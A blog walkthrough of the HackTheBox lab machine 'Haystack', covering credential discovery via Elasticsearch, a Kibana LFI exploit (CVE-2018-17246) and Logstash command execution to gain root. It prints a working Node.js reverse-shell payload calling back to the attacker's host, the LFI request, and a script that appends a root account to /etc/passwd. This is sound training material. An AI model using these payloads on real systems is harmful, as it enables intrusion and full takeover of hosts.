---
layout: post
title: Hackthebox Haystack Walkthrough
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-11-05/haystack-badge.png)
# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
To learn a new technique/knowledge, solve all machines (As much as possible!!).<br>
This is a walkthrough of a box "Haystack".<br>

# Solution
### 1. Initial Enumeration

TCP Port Scanning:
{% highlight shell %}
  root@kali:~# nmap -p- 10.10.10.115 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-04 15:42 EET
Nmap scan report for 10.10.10.115
Host is up (0.047s latency).
Not shown: 65532 filtered ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
| 2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
| 256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_ 256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp open http nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open http nginx 1.12.2
| http-methods:
|_ Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.51 seconds
{% endhighlight %}

HTTP enumeration:<br>
Sounds like only one page with heystack image available.
![placeholder](https://inar1.github.io/public/images/2019-11-05/2019-11-05-19-16-09.png)
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.115/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php,.txt -s '200,204,301,302,403'
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.115/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt
[+] Timeout:        10s
===============================================================
2019/11/05 19:40:48 Starting gobuster
===============================================================
/index.html (Status: 200)
===============================================================
2019/11/05 21:01:59 Finished
===============================================================
{% endhighlight %}

Port 9200 enumeration:<br>
We can figure out that Elasticsearch is running.
{% highlight shell %}
root@kali:~# curl http://10.10.10.115:9200/
{
  "name" : "iQEYHgS",
  "cluster_name" : "elasticsearch",
  "cluster_uuid" : "pjrX7V_gSFmJY-DxP4tCQg",
  "version" : {
    "number" : "6.4.2",
    "build_flavor" : "default",
    "build_type" : "rpm",
    "build_hash" : "04711c2",
    "build_date" : "2018-09-26T13:34:09.098244Z",
    "build_snapshot" : false,
    "lucene_version" : "7.4.0",
    "minimum_wire_compatibility_version" : "5.6.0",
    "minimum_index_compatibility_version" : "5.0.0"
  },
  "tagline" : "You Know, for Search"
}
{% endhighlight %}

### 2. Getting User

At first, take a look at port 80<br>.
We have only one file "needle.jpg" there.<br>
{% highlight html %}
root@kali:~# curl http://10.10.10.115
<html>
<body>
<img src="needle.jpg" />
</body>
</html>
{% endhighlight %}

To check if something interesting there, we can use "strings" command.
{% highlight shell %}
root@kali:~# strings needle.jpg 
JFIF
Exif
paint.net 4.1.1
UNICODE
$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
	#3R
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
sc,x

~~~

bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
{% endhighlight %}

We found base64 encoded data.<br>
Then, decode the message. We get a message with unknown language.
{% highlight shell %}
root@kali:~# echo 'bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==' | base64 -d
la aguja en el pajar es "clave"
{% endhighlight %}

Google is always our friend. Translate the message.
![placeholder](https://inar1.github.io/public/images/2019-11-05/2019-11-05-19-49-12.png)
{% highlight shell %}
la aguja en el pajar es "clave"

->
the needle in the haystack is "key"
{% endhighlight %}

Then, go back to elasticsearch.
<em>Elasticsearch is a search engine based on the Lucene library. It provides a distributed, multitenant-capable full-text search engine with an HTTP web interface and schema-free JSON documents.</em><br>
<br>
To send a query to elasticsearch, we need a parameter "q".
{% highlight shell %}
root@kali:~# curl http://10.10.10.115:9200/_search?q=clave
{"took":136,"timed_out":false,"_shards":{"total":11,"successful":11,"skipped":0,"failed":0},"hits":{"total":2,"max_score":5.9335938,"hits":[{"_index":"quotes","_type":"quote","_id":"45","_score":5.9335938,"_source":{"quote":"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "}},{"_index":"quotes","_type":"quote","_id":"111","_score":5.3459888,"_source":{"quote":"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="}}]}}
{% endhighlight %}

Then decode the base64 encoded data.
{% highlight shell %}
root@kali:~# echo 'dXNlcjogc2VjdXJpdHkg' | base64 -d
user: security

root@kali:~# echo 'cGFzczogc3BhbmlzaC5pcy5rZXk=' | base64 -d
pass: spanish.is.key
{% endhighlight %}

We got a credential for user "security" to login with ssh.
{% highlight shell %}
security:spanish.is.key
{% endhighlight %}
{% highlight shell%}
root@kali:~# ssh security@10.10.10.115
security@10.10.10.115's password: 
Last login: Tue Nov  5 14:44:15 2019 from 10.10.14.13
[security@haystack ~]$ id
uid=1000(security) gid=1000(security) groups=1000(security) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
{% endhighlight %}

As always, user.txt is in the home directory.
{% highlight shell %}
[security@haystack ~]$ ls -la
total 16
drwx------. 2 security security  99 Feb  6  2019 .
drwxr-xr-x. 3 root     root      22 Nov 28  2018 ..
lrwxrwxrwx. 1 root     root       9 Jan 25  2019 .bash_history -> /dev/null
-rw-r--r--. 1 security security  18 Apr 10  2018 .bash_logout
-rw-r--r--. 1 security security 193 Apr 10  2018 .bash_profile
-rw-r--r--. 1 security security 231 Apr 10  2018 .bashrc
-rw-r--r--. 1 security security  33 Feb  6  2019 user.txt

[security@haystack ~]$ cat user.txt 
04d18bc79dac1d4d48ee0a940c8eb929
{% endhighlight %}

### 3. Getting Root

After logged in, try to run "<a href="https://github.com/DominicBreuker/pspy">pspy</a>" to display all running process.<br>
We can find that "logstash" is running as a root user.
{% highlight shell %}
2019/11/08 05:07:10 CMD: UID=0    PID=6392   | /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash 
{% endhighlight %}

However, we can't access to the config file because we don't have appropriate permission.<br>
These files belong to a user "kibana".
{% highlight shell %}
[security@haystack conf.d]$ pwd
/etc/logstash/conf.d

[security@haystack conf.d]$ ls -l
total 12
-rw-r-----. 1 root kibana 131 Jun 20 10:59 filter.conf
-rw-r-----. 1 root kibana 186 Jun 24 08:12 input.conf
-rw-r-----. 1 root kibana 109 Jun 24 08:12 output.conf


[security@haystack conf.d]$ cat input.conf 
cat: input.conf: Permission denied

[security@haystack conf.d]$
{% endhighlight %}

Then, try to check which port kibana is running. Since we can't use netstat, use "ss" command.<br>
We have one interesting port 5601.
1. "-4": to use IPv4
2. "-l": listing all listening ports
3. "-n": display port numbers
{% highlight shell %}
[security@haystack ~]$ ss -4 -l -n
Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
udp    UNCONN     0      0      127.0.0.1:323                        *:*
tcp    LISTEN     0      128            *:80                         *:*
tcp    LISTEN     0      128            *:9200                       *:*
tcp    LISTEN     0      128            *:22                         *:*
tcp    LISTEN     0      128    127.0.0.1:5601                       *:*
*{% endhighlight %}

To access the "127.0.0.1:5601" from our localhost, we need port forwarding.<br>
We can find "Kibana" which is data visualization UI used with Elasticsearch.
{% highlight shell %}
ssh -L 5601:127.0.0.1:5601 security@10.10.10.115 -N
{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2019-11-05/2019-11-08-10-26-17.png)

By clicking the "Management" tab, we can figure out that the version of Kibana is "6.4.2"
![placeholder](https://inar1.github.io/public/images/2019-11-05/2019-11-08-10-27-10.png)

By quick search, we can find that this version of kibana has a <a href="https://github.com/mpgn/CVE-2018-17246">LFI "CVE-2018-17246"</a><br>
As it's written, upload followin javascript shell to "/dev/shm"<br>
shell.js:
{% highlight js %}
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.14.13", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
{% endhighlight %}

Then, launch a netcat listener and send a get request to access to the "shell.js".<br>
We can achieve a reverse shell as a user "kibana".
{% highlight shell %}
[security@haystack shm]$ curl 'http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../dev/shm/shell.js'
{% endhighlight %}
{% highlight shell %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.115] 53668
id
uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 00:50:56:b9:b4:73 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.115/24 brd 10.10.10.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:b473/64 scope global mngtmpaddr dynamic 
       valid_lft 86211sec preferred_lft 14211sec
    inet6 fe80::250:56ff:feb9:b473/64 scope link 
       valid_lft forever preferred_lft forever
{% endhighlihgt %}

After that, get a full shell with python command.
{% highlight shell %}
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.2$
{% endhighlight %}

Then, try to look at the files for logstash.<br>
We can refer a <a href="https://www.elastic.co/guide/en/logstash/current/pipeline.html">document</a> on the official website.<br>
filter.conf:
{% highlight shell %}
bash-4.2$ cat filter.conf
cat filter.conf
filter {
	if [type] == "execute" {
		grok {
			match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
		}
	}
}
{% endhighlight %}

input.conf:
{% highlight shell %}
bash-4.2$ cat input.conf
cat input.conf
input {
	file {
		path => "/opt/kibana/logstash_*"
		start_position => "beginning"
		sincedb_path => "/dev/null"
		stat_interval => "10 second"
		type => "execute"
		mode => "read"
	}
}
{% endhighlight %}

output.conf
{% highlight shell %}
bash-4.2$ cat output.conf
cat output.conf
output {
	if [type] == "execute" {
		stdout { codec => json }
		exec {
			command => "%{comando} &"
		}
	}
}
{% endhighlight %}

In summerize, logstash is executing a command with following condition.
1. The name of the config file has to be matched "logstash_*"
2. the key of the command is has to be "Ejecutar comando"
<br>
Create following shell script to add a new admin user in "/etc/passwd".<br>
We have to put it into "/dev/shm" with scp command.
{% highlight shell %}
root@kali:~# cat firefart.sh 
#!/bin/bash

echo 'firefart:fi6bS9A.C7BDQ:0:0:pwned:/root:/bin/bash' >> /etc/passwd
{% endhighlight %}
{% highlight shell %}
root@kali:~# scp firefart.sh security@10.10.10.115:/dev/shm
security@10.10.10.115's password: 
firefart.sh                                             100%   88     2.1KB/s   00:00
{% endhighlight %}

Then, create a following config file to achieve a reverse shell as user "kibana" with the following command.
{% highlight shell %}
echo 'Ejecutar comando : bash /dev/shm/firefart.sh' > /opt/kibana/logstash_firefart
{% endhighlight %}

After a few minutes, finally, we can confirm a new user "firefart" with password "test" was added in "/etc/passwd".<br>
To switch the user, we can use "su" command.
{% highlight shell %}
[security@haystack ~]$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
security:x:1000:1000:security:/home/security:/bin/bash
elasticsearch:x:997:995:elasticsearch user:/nonexistent:/sbin/nologin
logstash:x:996:994:logstash:/usr/share/logstash:/sbin/nologin
nginx:x:995:993:Nginx web server:/var/lib/nginx:/sbin/nologin
kibana:x:994:992:kibana service user:/home/kibana:/sbin/nologin
firefart:fi6bS9A.C7BDQ:0:0:pwned:/root:/bin/bash
[security@haystack ~]$
{% endhighlight %}
{% highlight shell %}
[security@haystack ~]$ su firefart
Password:

[root@haystack security]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
{% endhighlight %}

As always, root.txt is in the directory "/root"
{% highlight shell %}
[root@haystack security]# cat /root/root.txt 
3f5f727c38d9f70e1d2ad2ba11059d92
{% endhighlight %}
